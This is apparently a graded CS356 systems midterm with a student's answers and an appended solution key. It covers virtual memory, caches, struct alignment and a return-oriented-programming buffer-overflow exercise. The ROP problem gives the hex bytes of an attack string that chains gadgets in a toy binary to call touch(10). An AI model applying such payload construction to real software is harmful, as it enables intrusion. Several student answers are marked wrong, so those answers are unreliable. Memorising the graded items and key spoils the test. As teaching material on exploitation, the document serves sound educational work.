# CS356 Midterm 2

## Page Faults

[9/10 points] Explain:
- What causes a page fault and when.
- Who handles a page fault.
- How the handler modifies TLB, page table, cache.
- What happens when the execution is resumed.

```
When the TLB, VM, and cache all miss. The OS handles the page fault.
Data/instruction cache - writeback any modified blocks and invalidate all blocks belonging to that page.
TLB - check if there is a translation stored in the TLB -> if modified bit is set for translation set modified bit in the page table -> invalidate the translation.
Writeback page to disk if modified/dirty bit in page table is set.
Update page table entry to indicate its not present in memory anymore.
A new page is brought in and the page table/directory is updated.
```



## Addressing: TLB, Page Table, Caches

Consider a processor with:
- 24-bit physical addresses space
- 16-bit virtual addresses space
- page size of 2k bytes
- single-level page table using 16 bytes per entry
- a TLB with 11 entries and 1 sets
- a cache with 4 ways, blocks of 128 bytes, size of 32k bytes

[1/1 points] What is the maximum amount of physical memory?

```
2^24 bytes
```

[2/2 points] How is the physical address split?

```
physical frame number: 13 bits
page offset: 11 bits
```

[1/1 points] What is the number of physical frames?

```
2^13 frames
```

[2/2 points] How is the virtual address split?

```
virtual page number: 5 bits
page offset: 11 bits
```

[1/1 points] How many pages are in the virtual address space?

```
2^5 pages
```

[2/2 points] What is the size of each page table?

```
(2^5) * 16 bytes
```

[1/1 points] What is the number of ways of the TLB?

```
11 ways
```

[0/2 points] What is the number of bits used as TLB tag?

```
11 bits
```

[1/1 points] What is the number of bits used as cache block offset?

```
7 bits
```

[0/2 points] What is the number of bits used as cache tag?

```
10 bits
```

[3/3 points] If the hit rate is 0.9, the hit time 20 ns, the miss
           penalty 200 ns, what is the cache average access time?

```
20ns + (0.1 * 200ns) = 40ns
```



## Caches: Data Access

Consider a processor with:
- 18-bit physical address space
- 2-way set-associative cache with 16 sets
- 64-byte lines

Assume the following values for the cache metadata:

```
          WAY_0     WAY_1     
          V  TAG    V  TAG    
          ========  ========  
  SET_0   1  0x10   1  0x12   
  SET_1   1  0x0B   1  0xFF   
  SET_2   0  0xF0   0  0xA2   
  SET_3   1  0x92   1  0x1B   
  SET_4   1  0xE8   1  0xBC   
  SET_5   1  0xDD   0  0x75   
  SET_6   1  0x43   0  0xC2   
  SET_7   0  0x33   1  0x0D   
  SET_8   0  0xB6   0  0xF2   
  SET_9   1  0xEB   1  0xE1   
  SET_10  1  0x14   1  0x0C   
  SET_11  0  0x70   1  0x45   
  SET_12  1  0x4F   1  0xFC   
  SET_13  0  0x39   1  0x87   
  SET_14  1  0xD6   1  0x82   
  SET_15  0  0x62   0  0x99   
```

[3/3 points] An access to 0x30059 will result in a

```
( ) hit
( ) miss and no eviction
(x) miss and eviction
```

[3/3 points] An access to 0x2889B will result in a

```
( ) hit
(x) miss and no eviction
( ) miss and eviction
```

[0/3 points] An access to 0x2F67A will result in a

```
( ) hit
(x) miss and no eviction
( ) miss and eviction
```

[2/2 points] What is the size of the cache?

```
(32 * 64) = 2^11 bytes
```



## Virtual Memory: Address Translation with Single-Level Page Table

Consider a processor with:
- 20-bit physical addresses space
- 15-bit virtual addresses space
- page size of 4k bytes
- the following page table in use for a process

```
Index   V  ENTRY
=====   ==========
    0   1  0x59
    1   1  0x17
    2   1  0x41
    3   1  0xFF
    4   0  0x33
    5   1  0x05
    6   1  0x30
    7   0  0x2D
```

[2/2 points] What is the physical address for virtual address 0x290B?

```
0x4190B
```

[2/2 points] What is the physical address for virtual address 0x61A4?

```
0x301A4
```

[2/2 points] What is the physical address for virtual address 0x42CC?

```
Invalid
```

[2/2 points] What is the virtual address for physical address 0x17958?

```
0x1958
```

[2/2 points] It is possible for the TLB to hold a mapping for virtual
           address 0x74CF?

```
No
```



## Virtual Memory: 3-Level Page Tables

Consider a processor with:
- 21-bit physical addresses
- 32-bit virtual addresses
- page size of 8k bytes
- 512 entries in the page directory
- 32 entries in the second-level page tables
- 4-byte entries for all page tables

[1/1 points] What is the maximum amount of physical memory?

```
2^21 bytes
```

[4/4 points] How is the virtual address split?

```
page directory index: 9 bits
2nd level page table index: 5 bits
3nd level page table index: 5 bits
page offset: 13 bits
```

[5/5 points] At most, how many page tables can a process have?

```
page directories: at most 1
2nd level page tables: at most 512
3nd level page tables: at most (512 * 32) = 2^14
```

[3/3 points] What is the maximum space requirements of all page tables?

```
(1 * 2^9 * 4) + (2^9 * 2^5 * 4) + (2^14 * 2^5 * 4) bytes
(2^11) + (2^16) + (2^21) bytes
```

[3/3 points] What would the maximum space requirement be with a
           single-level page table?

```
(2^14 * 2^5 * 4) bytes
(2^21) bytes
```



## Simple struct alignment

Consider the following C struct (4-byte int/float, 8-byte long/double):

```
struct record_t {
  char a;
  short b;
  float c;
  double d;
  int e;
  char f;
};
```

[5/5 points] What is the alignment of each member?

```
a starts at 0
b starts at 2
c starts at 4
d starts at 8
e starts at 16
f starts at 20
```



## Nested struct alignment

Consider the following C struct (4-byte int/float, 8-byte long/double):

```
struct record_t {
  struct nested1_t {
    float a;
    double b;
  };
  char c;
  short d;
  struct nested2_t {
    char e;
    float f;
    char g;
  };
  char h;
};
```

[9/10 points] What is the alignment of each member?

```
a starts at 0
b starts at 8
c starts at c
d starts at 18
e starts at 20
f starts at 24
g starts at 28
h starts at 32
```



## Return Oriented Programming

Consider the following disassembled program invoking `gets` on an x86-64
processor (little-endian):

```
0000000000401142 <getbuf>:
  401142:	48 83 ec 15          	subq   $0x15,%rsp
  401146:	48 8d 7c 24 0f       	leaq   0xf(%rsp),%rdi
  40114b:	e8 24 00 00 00       	callq  401174 <gets>
  401150:	48 83 c4 15          	addq   $0x15,%rsp
  401154:	c3                   	retq   

00000000004011ab <main>:
  4011ab:	48 83 ec 08          	subq   $0x8,%rsp
  4011af:	e8 8e ff ff ff       	callq  401142 <getbuf>
  4011b4:	e8 9c ff ff ff       	callq  401155 <args>
  4011b9:	b8 01 00 00 00       	movl   $0x1,%eax
  4011be:	48 83 c4 08          	addq   $0x8,%rsp
  4011c2:	c3                   	retq   

00000000004011fa <touch>:
  4011fa:	48 83 ec 08          	subq   $0x8,%rsp
  4011fe:	83 ff 0a             	cmpl   $0xa,%edi
  401201:	40 0f 95 c7          	setne  %dil
  401205:	40 0f b6 ff          	movzbl %dil,%edi
  401209:	e8 32 fe ff ff       	callq  401040 <exit@plt>

000000000040120e <gadget1>:
  40120e:	48 c7 c2 01 00 00 00 	movq   $0x1,%rdx
  401215:	48 31 ca             	xorq   %rcx,%rdx
  401218:	c3                   	retq   

0000000000401219 <gadget2>:
  401219:	48 89 e0             	movq   %rsp,%rax
  40121c:	c3                   	retq   

000000000040121d <gadget3>:
  40121d:	48 89 c1             	movq   %rax,%rcx
  401220:	c3                   	retq   

0000000000401221 <gadget4>:
  401221:	48 89 d7             	movq   %rdx,%rdi
  401224:	c3                   	retq   

0000000000401225 <gadget5>:
  401225:	58                   	popq   %rax
  401226:	c3                   	retq   

```

[14/20 points]  Provide as hex (e.g., "f1 f2") the bytes of the attack string
invoking `touch(10)`:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
25 12 40 00 00 00 00 00
0b 00 00 00 00 00 00 00
1d 12 40 00 00 00 00 00
0e 12 40 00 00 00 00 00
21 12 40 00 00 00 00 00
08 ec 83 48 00 00 00 00
```





# Solutions 

## Problem 1

(Summary of page faults.)


## Problem 2

16M

physical frame number: 13 bits
page offset: 11 bits

8k

virtual page number: 5 bits
page offset: 11 bits

32

512

11

5

7

11

40.0 ns



## Problem 3

miss and eviction

miss and no eviction

miss and eviction

2k



## Problem 4

0x4190B

0x301A4

Invalid

0x1958

False



## Problem 5

2M

9
5
5
13

1
512
16k

2k + 64k + 2M

2M



## Problem 6

a starts at 0
b starts at 2
c starts at 4
d starts at 8
e starts at 16
f starts at 20



## Problem 7

a starts at 0
b starts at 8
c starts at 16
d starts at 18
e starts at 20
f starts at 24
g starts at 28
h starts at 32



## Problem 8

11 22 33 44 55 66 
25 12 40 00 00 00 00 00
0b 00 00 00 00 00 00 00
1d 12 40 00 00 00 00 00
0e 12 40 00 00 00 00 00
21 12 40 00 00 00 00 00
fa 11 40 00 00 00 00 00



